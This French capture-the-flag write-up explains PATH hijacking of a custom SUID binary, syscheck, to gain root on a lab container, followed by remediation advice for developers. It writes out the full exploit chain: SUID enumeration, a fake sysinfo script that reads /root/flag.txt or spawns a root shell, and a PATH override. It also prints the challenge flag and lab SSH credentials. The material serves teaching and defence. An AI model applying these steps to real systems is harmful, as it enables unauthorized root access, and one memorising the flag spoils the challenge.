# Writeup — PATH Hijacking via SUID Binary

**Catégorie** : Linux / Privilege Escalation  
**Difficulté** : Medium  
**Points** : 300  
**Flag** : `CTF{path_hijack_suid_custom_binary}`

## Contexte

Lorsqu'un binaire SUID appelle `system()` avec une commande sans chemin absolu (ex: `system("sysinfo")` au lieu de `system("/usr/bin/sysinfo")`), le système utilise la variable `$PATH` pour rechercher l'exécutable. Si un attaquant peut contrôler `$PATH` et placer un exécutable malveillant avant le vrai binaire dans la liste des chemins, ce faux binaire sera exécuté à la place — avec les privilèges SUID du binaire parent (root dans ce cas).

## Connexion

```bash
ssh player@<TARGET_IP> -p 5023
# password: player2026
```

## Étapes de résolution

### 1. Énumération initiale

On recherche les binaires SUID sur le système :

```bash
player@container:~$ find / -perm -4000 -type f 2>/dev/null
```

Sortie attendue (extrait) :

```
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
/usr/local/bin/syscheck    <-- INHABITUEL
```

`/usr/local/bin/syscheck` n'est pas un binaire système standard. C'est notre cible.

Vérification des permissions :

```bash
player@container:~$ ls -la /usr/local/bin/syscheck
-rwsr-xr-x 1 root root 16056 Jan  1 00:00 /usr/local/bin/syscheck
```

Le bit SUID est bien présent (`rws`), propriétaire `root`.

### 2. Identification de la vulnérabilité

On inspecte le binaire avec `strings` pour comprendre ce qu'il fait :

```bash
player@container:~$ strings /usr/local/bin/syscheck
```

Sortie attendue (extrait significatif) :

```
/lib64/ld-linux-x86-64.so.2
libc.so.6
setresuid
setresgid
system
puts
...
[*] Running system diagnostics...
sysinfo
...
```

Points clés :
- `setresuid` et `setresgid` : le binaire élève ses privilèges à root explicitement
- `system` : il appelle la fonction `system()` de la libc
- `sysinfo` : la commande appelée — **sans chemin absolu**

Si on tente de lancer le binaire tel quel :

```bash
player@container:~$ /usr/local/bin/syscheck
[*] Running system diagnostics...
sh: 1: sysinfo: not found
```

Le binaire cherche `sysinfo` dans le `$PATH` et ne le trouve pas.

### 3. Exploitation

L'idée est de créer notre propre exécutable nommé `sysinfo` dans un répertoire contrôlable, puis de mettre ce répertoire en premier dans le `$PATH`.

**Étape 3a** : Créer le faux exécutable `sysinfo`

```bash
player@container:~$ cat > /tmp/sysinfo << 'EOF'
#!/bin/bash
cat /root/flag.txt
EOF

player@container:~$ chmod +x /tmp/sysinfo
```

On peut aussi viser un shell interactif :

```bash
player@container:~$ echo -e '#!/bin/bash\n/bin/bash' > /tmp/sysinfo
player@container:~$ chmod +x /tmp/sysinfo
```

**Étape 3b** : Modifier le PATH pour placer `/tmp` en premier

```bash
player@container:~$ export PATH=/tmp:$PATH
player@container:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Étape 3c** : Exécuter le binaire SUID

```bash
player@container:~$ /usr/local/bin/syscheck
[*] Running system diagnostics...
```

### 4. Récupération du flag

Si le faux `sysinfo` affiche directement le flag :

```bash
player@container:~$ /usr/local/bin/syscheck
[*] Running system diagnostics...
CTF{path_hijack_suid_custom_binary}
```

Si le faux `sysinfo` lance un shell :

```bash
root@container:~# whoami
root
root@container:~# cat /root/flag.txt
CTF{path_hijack_suid_custom_binary}
```

## Explication de la vulnérabilité

Le binaire `syscheck` appelle `system("sysinfo")` (sans chemin absolu) après avoir élevé ses privilèges à root avec `setresuid(0,0,0)`. La fonction `system()` de la libc démarre un sous-shell (`/bin/sh -c "sysinfo"`) qui utilise la variable d'environnement `$PATH` pour résoudre le nom `sysinfo`. Puisque `$PATH` est hérité du processus appelant et que l'utilisateur contrôle cette variable, il peut insérer un chemin malveillant.

Note importante : contrairement au cas `-p` de bash, `system()` ne réinitialise pas les privilèges, donc le sous-shell hérite bien des droits root.

**Impact réel** : Exécution de code arbitraire en tant que root. Tout développeur qui écrit un binaire SUID appelant des commandes externes par leur nom seul crée cette vulnérabilité.

## Recommandations de remédiation

1. **Toujours utiliser des chemins absolus** dans les appels système des binaires SUID :
   ```c
   system("/usr/bin/sysinfo");  // Correct
   system("sysinfo");           // DANGEREUX
   ```
2. **Réinitialiser le PATH** avant tout appel système dans un binaire SUID :
   ```c
   setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
   ```
3. **Préférer `execve()` à `system()`** : `execve` ne passe pas par un shell et ne fait pas de résolution PATH.
4. **Éviter les binaires SUID custom** : utiliser sudo avec des règles précises est plus sûr.
5. **Auditer le code** de tout binaire SUID avec des outils comme `strings`, `strace`, `ltrace`.

## Références

- GTFOBins - PATH hijacking : https://gtfobins.github.io/
- MITRE ATT&CK T1574.007 (Path Interception by PATH Environment Variable) : https://attack.mitre.org/techniques/T1574/007/
- "Dangerous system() calls" — Linux man page : https://man7.org/linux/man-pages/man3/system.3.html
- SUID Privilege Escalation — HackTricks : https://book.hacktricks.xyz/linux-hardening/privilege-escalation#suid
